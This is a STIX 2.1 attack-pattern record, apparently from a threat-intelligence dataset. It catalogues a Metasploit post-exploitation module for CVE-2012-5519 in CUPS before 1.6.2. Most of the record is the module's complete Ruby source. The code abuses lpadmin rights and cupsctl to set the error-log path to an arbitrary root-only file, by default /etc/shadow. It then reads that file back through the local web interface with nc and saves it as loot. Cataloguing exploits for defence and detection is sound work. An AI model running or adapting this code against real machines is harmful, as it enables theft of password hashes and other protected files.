{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e0f78ef3-b876-4dab-9838-7b256273e122",
    "created": "2024-08-14T16:33:17.994686Z",
    "modified": "2024-08-14T16:33:17.99469Z",
    "name": "CUPS 1.6.1 Root File Read",
    "description": " This module exploits a vulnerability in CUPS < 1.6.2, an open source printing system. CUPS allows members of the lpadmin group to make changes to the cupsd.conf configuration, which can specify an Error Log path. When the user visits the Error Log page in the web interface, the cupsd daemon (running with setuid root) reads the Error Log path and echoes it as plaintext.  This module is known to work on Mac OS X < 10.8.4 and Ubuntu Desktop <= 12.0.4 as long as the session is in the lpadmin group.  Warning: if the user has set up a custom path to the CUPS error log this module might fail to reset that path correctly. You can specify a custom error log path with the ERROR_LOG datastore option.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/escalate/cups_root_file_read.rb",
            "external_id": "cups_root_file_read.rb"
        },
        {
            "source_name": "reference",
            "url": "http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  LP_GROUPS = ['lpadmin', '_lpadmin']\n\n  attr_accessor :web_server_was_disabled, :error_log_was_reset\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'CUPS 1.6.1 Root File Read',\n          'Description' => %q{\n            This module exploits a vulnerability in CUPS < 1.6.2, an open source printing system.\n            CUPS allows members of the lpadmin group to make changes to the cupsd.conf\n            configuration, which can specify an Error Log path. When the user visits the\n            Error Log page in the web interface, the cupsd daemon (running with setuid root)\n            reads the Error Log path and echoes it as plaintext.\n\n            This module is known to work on Mac OS X < 10.8.4 and Ubuntu Desktop <= 12.0.4\n            as long as the session is in the lpadmin group.\n\n            Warning: if the user has set up a custom path to the CUPS error log,\n            this module might fail to reset that path correctly. You can specify\n            a custom error log path with the ERROR_LOG datastore option.\n          },\n          'References' => [\n            ['CVE', '2012-5519'],\n            ['OSVDB', '87635'],\n            ['URL', 'http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791']\n          ],\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Jann Horn', # discovery\n            'joev' # metasploit module\n          ],\n          'DisclosureDate' => '2012-11-20',\n          'Platform' => %w[linux osx]\n        }\n      )\n    )\n    register_options([\n      OptString.new('FILE', [true, 'The file to steal.', '/etc/shadow']),\n      OptString.new('ERROR_LOG',\n                    [true, 'The original path to the CUPS error log', '/var/log/cups/error_log'])\n    ])\n  end\n\n  def check_exploitability\n    user = cmd_exec('whoami')\n    user_groups = cmd_exec(\"groups #{[user].shelljoin}\").split(/\\s+/)\n    if (user_groups & LP_GROUPS).empty?\n      print_error 'User not in lpadmin group.'\n      return Msf::Exploit::CheckCode::Safe\n    else\n      print_good 'User in lpadmin group, continuing...'\n    end\n\n    if ctl_path.blank?\n      print_error 'cupsctl binary not found in $PATH'\n      return Msf::Exploit::CheckCode::Safe\n    else\n      print_good 'cupsctl binary found in $PATH'\n    end\n\n    nc_path = whereis('nc')\n    if nc_path.nil? || nc_path.blank?\n      print_error 'Could not find nc executable'\n      return Msf::Exploit::CheckCode::Unknown\n    else\n      print_good 'nc binary found in $PATH'\n    end\n\n    config_path = whereis('cups-config')\n    config_vn = nil\n\n    if config_path.nil? || config_path.blank?\n      # cups-config not present, ask the web interface what vn it is\n      output = get_request('/')\n      if output =~ /title.*CUPS\\s+([\\d.]+)/i\n        config_vn = ::Regexp.last_match(1).strip\n      end\n    else\n      config_vn = cmd_exec('cups-config --version').strip # use cups-config if installed\n    end\n\n    if config_vn.nil?\n      print_error 'Could not determine CUPS version.'\n      return Msf::Exploit::CheckCode::Unknown\n    end\n\n    print_status \"Found CUPS #{config_vn}\"\n\n    config_parts = config_vn.split('.')\n    if (config_vn.to_f < 1.6) || ((config_vn.to_f <= 1.6) && (config_parts[2].to_i < 2)) # <1.6.2\n      Msf::Exploit::CheckCode::Vulnerable\n    else\n      Msf::Exploit::CheckCode::Safe\n    end\n  end\n\n  def run\n    if check_exploitability == Msf::Exploit::CheckCode::Safe\n      print_error 'Target machine not vulnerable, bailing.'\n      return\n    end\n\n    defaults = cmd_exec(ctl_path)\n    @web_server_was_disabled = defaults =~ /^WebInterface=no$/i\n\n    # first we set the error log to the path intended\n    cmd_exec(\"#{ctl_path} ErrorLog=#{datastore['FILE']}\")\n    cmd_exec(\"#{ctl_path} WebInterface=yes\")\n    @error_log_was_reset = true\n\n    # now we go grab it from the ErrorLog route\n    file = strip_http_headers(get_request('/admin/log/error_log'))\n\n    # and store as loot\n    f = File.basename(datastore['FILE'])\n    loot = store_loot('cups_file_read', 'application/octet-stream', session, file, f)\n    print_good(\"File #{datastore['FILE']} (#{file.length} bytes) saved to #{loot}\")\n  end\n\n  def cleanup\n    print_status 'Cleaning up...'\n    cmd_exec(\"#{ctl_path} WebInterface=no\") if web_server_was_disabled\n    cmd_exec(\"#{ctl_path} ErrorLog=#{prev_error_log_path}\") if error_log_was_reset\n    super\n  end\n\n  private\n\n  def prev_error_log_path\n    datastore['ERROR_LOG']\n  end\n\n  def ctl_path\n    @ctl_path ||= whereis('cupsctl')\n  end\n\n  def strip_http_headers(http)\n    http.gsub(/\\A(^.*\\r\\n)*/, '')\n  end\n\n  def whereis(exe)\n    line = cmd_exec(\"whereis #{exe}\")\n    if line =~ /^\\S+:\\s*(\\S*)/i\n      ::Regexp.last_match(1) # on ubuntu whereis returns \"cupsctl: /usr/sbin/cupsctl\"\n    else\n      line # on osx it just returns '/usr/sbin/cupsctl'\n    end\n  end\n\n  def get_request(uri)\n    output = perform_request(uri, 'nc -j localhost 631')\n\n    if output =~ /^(?:usage: nc|nc: invalid option -- 'j')/\n      output = perform_request(uri, 'nc localhost 631')\n    end\n\n    output\n  end\n\n  def perform_request(uri, nc_str)\n    # osx requires 3 newlines!\n    cmd_exec(['printf', \"GET #{uri}\\r\\n\\r\\n\\r\\n\".inspect, '|', nc_str].join(' '))\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2012-11-20",
    "x_mitre_platforms": [
        "%w[linux osx]"
    ]
}